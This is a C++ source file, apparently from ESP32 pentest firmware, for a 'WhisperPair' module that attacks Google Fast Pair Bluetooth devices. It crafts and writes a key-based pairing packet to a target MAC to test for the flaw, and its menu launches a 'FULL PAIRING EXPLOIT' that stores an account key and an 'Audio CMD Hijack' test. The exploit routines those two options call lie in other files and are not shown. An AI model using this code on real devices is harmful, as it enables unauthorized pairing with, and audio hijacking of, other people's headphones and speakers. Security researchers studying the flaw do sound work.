#include "whisperpair.h"
#include "whisperpair_audio.h"
#include "whisperpair_scan.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <globals.h>

extern std::vector<String> fastPairDevices;

bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("CONFIRMATION REQUIRED");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    padprintln(message);
    padprintln("");
    padprintln("Hold SELECT for " + String(ms/1000) + "s");
    padprintln("or press ESC to cancel");

    uint32_t startTime = millis();
    bool holding = false;

    while(millis() - startTime < ms) {
        if(check(EscPress)) {
            displayMessage("Cancelled", "", "", "", 0);
            delay(1000);
            return false;
        }

        if(check(SelPress)) {
            holding = true;
            int progress = ((millis() - startTime) * 100) / ms;
            tft.fillRect(20, 120, tftWidth-40, 10, bruceConfig.bgColor);
            tft.fillRect(20, 120, ((tftWidth-40) * progress) / 100, 10, TFT_GREEN);
        } else {
            if(holding) {
                displayMessage("Released too soon", "", "", "", 0);
                delay(1000);
                return false;
            }
        }

        delay(50);
    }

    if(holding) {
        displayMessage("Confirmed!", "", "", "", 0);
        delay(500);
        return true;
    }

    return false;
}

bool attemptKeyBasedPairing(NimBLEAddress target) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("CONNECTING");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    padprintln("Connecting to target...");

    NimBLEClient* pClient = NimBLEDevice::createClient();

    if(!pClient->connect(target)) {
        displayMessage("Connection failed", "", "", "", 0);
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    padprintln("Connected");
    padprintln("Discovering...");

    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(pService == nullptr) {
        displayMessage("Fast Pair service", "not found", "", "", 0);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(pChar == nullptr) {
        displayMessage("KBP char not found", "", "", "", 0);
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        return false;
    }

    uint8_t packet[16] = {0};
    packet[0] = 0x00;
    packet[1] = 0x11;

    uint8_t targetBytes[6];
    std::string macStr = target.toString();
    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &targetBytes[5], &targetBytes[4], &targetBytes[3],
           &targetBytes[2], &targetBytes[1], &targetBytes[0]);

    memcpy(&packet[2], targetBytes, 6);

    esp_fill_random(&packet[8], 8);

    padprintln("Sending test packet...");

    if(pChar->writeValue(packet, 16, false)) {
        padprintln("Packet sent");
        padprintln("Checking...");
        delay(100);

        bool vulnerable = pChar->canRead() || pChar->canNotify();

        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);

        if(vulnerable) {
            return true;
        } else {
            return false;
        }
    }

    pClient->disconnect();
    NimBLEDevice::deleteClient(pClient);
    return false;
}

void testFastPairVulnerability() {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("FAST PAIR TEST");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    padprintln("Enter target MAC:");
    padprintln("(AA:BB:CC:DD:EE:FF)");
    
    String input = keyboard("", 17, "Target MAC");
    if(input.isEmpty()) return;

    NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);

    if(!requireButtonHoldConfirmation("Test vulnerability?", 3000)) {
        return;
    }

    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("TESTING");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    padprintln("Testing device...");
    
    bool vulnerable = attemptKeyBasedPairing(target);

    Serial.printf("[WhisperPair] %s - %s\n", 
        input.c_str(), 
        vulnerable ? "VULNERABLE" : "PATCHED/SAFE"
    );

    if(vulnerable) {
        displayMessage("VULNERABLE!", "Device is vulnerable", "", "", 3000);
    } else {
        displayMessage("PATCHED/SAFE", "Device may be patched", "", "", 3000);
    }
}

void whisperPairMenu() {
    std::vector<Option> options;

    options.push_back({"[🔍] Scan & Test", []() {
        whisperPairScanMenu();
    }});

    options.push_back({"[-] Test Vulnerability", []() {
        testFastPairVulnerability();
    }});

    options.push_back({"[ECDH] Crypto Benchmark", []() {
        extern void whisperPairFullBenchmark();
        whisperPairFullBenchmark();
        padprintln("");
        padprintln("Press any key");
        while(!check(AnyKeyPress)) delay(50);
    }});

    options.push_back({"[$$] Full Pair Test", []() {
        if(!requireButtonHoldConfirmation("FULL PAIRING EXPLOIT", 5000)) return;

        String input = keyboard("", 17, "Target MAC (AA:BB:CC:DD:EE:FF)");
        if(input.isEmpty()) return;

        NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);

        displayMessage("Starting full exploit...", "", "", "", 0);
        padprintln("1. Connect to device");
        padprintln("2. ECDH key exchange");
        padprintln("3. Complete pairing");
        padprintln("4. Store account key");

        if(!requireButtonHoldConfirmation("CONFIRM FULL EXPLOIT", 3000)) return;

        extern bool whisperPairFullExploit(NimBLEAddress);
        bool success = whisperPairFullExploit(target);

        if(success) {
            displayMessage("EXPLOIT SUCCESSFUL!", "", "", "", 0);
            displayMessage("Device paired", "", "", "", 0);
        } else {
            displayMessage("Exploit failed", "", "", "", 0);
            displayMessage("May be patched", "", "", "", 0);
        }
        delay(3000);
    }});

    options.push_back({"[🎤] Audio CMD Hijack", []() {
        audioCommandHijackTest();
    }});

    options.push_back({"Back", []() { returnToMenu = true; }});

    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair");
}